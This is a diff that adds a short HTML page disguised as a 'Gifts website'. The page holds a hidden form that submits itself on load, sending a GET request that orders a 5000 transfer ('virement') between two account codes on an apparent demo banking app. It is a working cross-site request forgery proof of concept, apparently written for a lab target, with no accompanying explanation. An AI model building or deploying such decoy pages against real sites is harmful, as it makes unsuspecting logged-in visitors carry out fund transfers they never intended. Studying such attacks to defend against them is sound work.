@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+      <meta charset="UTF-8">
+      <title>Gifts website</title>
+  </head>
+  <body>
+  <form id="form" style="display: none;" action="https://csrf-target-app.azurewebsites.net/operations?codeCompte=afff8fe7-7f4c-4e26-8103-c292c0a9da8e&opType=virement&montant=5000&codeBeneficiaire=a85f0249-4602-45f8-88af-ea6fd8b3307b" method="get">
+
+  </form>
+
+  <script>
+    const form = document.getElementById("form");
+
+    window.onload = (e) => form.submit();
+
+  </script>
+  </body>
+</html>
